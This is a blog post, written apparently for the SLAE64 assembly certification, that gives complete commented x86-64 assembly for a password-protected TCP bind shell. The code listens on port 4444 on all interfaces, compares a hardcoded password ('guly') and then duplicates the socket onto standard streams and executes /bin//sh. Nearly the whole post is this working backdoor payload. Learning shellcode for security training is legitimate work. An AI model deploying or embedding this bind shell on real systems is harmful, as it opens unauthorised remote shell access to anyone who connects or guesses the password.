---
layout: post
title: SLAE64 Assignment 1 - password protected tcp bindshell
exceprt: asm code and comments for my pass protected tcp bindshell
---

    ; name       : bindshell
    ; author     : Sandro "guly" Zaccarini SLAE64-1497
    ; purpose    : this program will open a listening socket on 0.0.0.0, waits for connection
    ;              and spawn a shell if the first 4chars match an hardcoded password
    ;              this code has been written for SLAE64 assignment 1
    ; references : https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ ,
    ;              /usr/include/linux/net.h
    ; license    : CC-BY-NC-SA
    ;
    ; high level flow:
    ; socket -> bind -> listen -> accept -> password check -> dup fd -> spawn /bin//sh
    
    ; known issues:
    ; 1) doesn't handle multiple clients
    ; 2) doesn't handle client-close and so_reuseaddr
    ; 3) doesn't handle "bruteforce", but i see this as a plus: i can try again if i fail
    ;    the password. i'm not worried about bruteforce here
    ; 4) the password cannot be longer than 8bytes, for >4bytes you should change e* to r*
    ; 5) password can only be a valid string
    ; 6) \r\n are not handled, but you can write guly 42 times and first or later you'll have it :)
    
      global _start
    
      section .text
    ; define placed before _start to have it "rel"able without jmp
    PASSWORD: db "guly" ; 0x796c7567
    PORT:     db 0x11,0x5c  ; 4444
    
    ; neat exit on top, not really needed
      exit:
    xor rax,rax
    mov rdi,rax
    mov al,0x3C
    syscall
    
      _start:
    ; create a TCP socket
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; rdi => AF_INET = 2
    ; rsi => SOCK_STREAM = 1
    ; rax => syscall number 0x29
    
    ; starting with a known null at rax,rdx,rdi and rsi
    ; even if not that readable, using push/pop i can save some bytes against mov
    xor rax,rax
    push rax
    pop rdx
    push rax
    pop rdi
    push rax
    pop rsi
    
    ; and because everything's 0x, i can add or inc working with 8/32bit to save some bytes
    add al, 0x29
    add edi, 0x2
    inc esi
    syscall
    
    ; syscall rets socketfd to rax. copy it to edi, we need it for the whole process
    ; again, working with 32bit to save some bytes
    mov edi, eax
    
    
    ; fire a bind() to created socket
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ;
    ; where struct is built like this:
    ; server.sin_family = AF_INET => 0x2
    ; server.sin_port = htons(PORT) => defined in PORT
    ; server.sin_addr.s_addr = INADDR_ANY => 0.0.0.0 => 0x0
    ; bzero(&server.sin_zero, 8)
    ;
    ; rdi => socketfd, saved at edi actually
    ; rsi => pointer to struct
    ; rdx => addr len, fixed at 0x10
    ; rax => syscall number 0x31
    
    ; create the struct, starting with a known null at rsp
    ; rsp => 0x00000000
    xor rax, rax
    push rax
    ; rsp => 0x0000000000000000
    
    ; mov AF_INET
    mov byte [rsp], 0x2
    ; rsp => 0x00000000000002
    
    ; and mov port
    mov ax, [rel PORT]
    mov word [rsp+0x2], ax
    ; rsp => 0x0000005c110002
    ; and place pointer to rsi
    mov rsi, rsp
    
    ; syscall id to rax using r12 which is zero
    mov r12b, 0x31
    mov eax,r12d
    
    ; addrlen, 16 or 0x10
    mov dl, 0x10
    
    ; and do the bind()
    syscall
    
    ; a bind with no listen is useless, let's listen
    ; listen(sock, MAX_CLIENTS)
    ; 
    ; rdi => socketfd, already in rdi
    ; rsi => 0x1, accept just 1 client
    ; rax => syscall number 0x32
    
    ; start with a null rax/rsi
    xor rax,rax
    push rax
    pop rsi
    add ax, 0x32
    inc esi
    syscall
    
    ; and again, a listen with no accept is useless
    ; 
    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    ; rdi => socketfd, already in rdi
    ; rsi => pointer to sockaddr struct
    ; rdx => pointer to addr len, fixed to 0x10 (16)
    ; rax => syscall number 0x2b
    
    ; work with ops as small as possible
    xor rax,rax
    mov al, 0x2b
    ; make some room, hoping that upper stack is empty...
    ; to have an empty 16bytes i've could also:
    ; dec esi ; to have esi 0x0
    ; push rsi
    
    sub rsp, 0x10
    mov rsi, rsp
    mov byte [rsp-1], 0x10
    sub rsp, 0x1
    mov rdx, rsp
    
    syscall
    
    ; save the client socket file descriptor, r9 is unused
    mov r9, rax
    
    ; read password from connected client using read() syscall 0x0
    ; and store in rsp
    ; 
    ; rdi => client fd
    readpass:
    ; syscall is 0x0, so a xor will be perfect
    ; i also need to move a small value to rdx, i zero it too
    xor rdx, rdx
    mov rax,rdx
    
    ; to have some room for the read, i'm pushing a full null here
    push rdx
    
    ; because i known my pass is just 0x4 chars, i force it here.
    ; see description for possible issue
    mov dl, 0x4
    
    ; and put the pointer to the stack to rsi
    mov rsi, rsp
    mov rdi,r9
    
    ; do the read
    syscall
    
    ; move my pass to eax, because i know it will fit. for longer pass, use rax.
    ; for even longer pass, scasd will not be the right op
    mov eax, [rel PASSWORD]
    ; because client's password has been stored in rsp, move a pointer to rdi
    mov rdi,rsp
    ; scasd will check 4byte from eax to edi pointed memory location
    scasd
    
    ; if doesn't match, back to readpass. using this "loop" i can fail password and have
    ; the shell listening again.
    ; as i said in the description, i don't care about bruteforce and that's why no counter
    jne readpass
    
    ; if the pass matches, dup2 to have some fd for the shell
    ; dup2 (new, old)
    ; STDIN
    xor eax,eax
    xor rsi,rsi
    mov rdi, r9
    mov al, 0x21
    syscall
    
    ; STDOUT
    mov al, 0x21
    inc rsi
    syscall
    
    ; STDERR
    mov al, 0x21
    inc rsi
    syscall
    
    ; and finally, execve
    ;
    ; rdi => pointer to filename, /bin//sh null terminated
    ; rsi => pointer to argv
    ; rdx => pointer to envp, null
    ; rax => syscall id 0x3b
    
    ; push a null terminator
    xor rax, rax
    push rax
    ; pointer to 0x0 for envp
    mov rdx,rsp
    
    ; and push /bin//sh in reverse
    mov rbx, 0x68732f2f6e69622f
    push rbx
    
    ; finally store pointer to rdi and rsi
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    
    ; do the call
    add rax, 0x3b
    syscall
    
    call exit
    
*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*
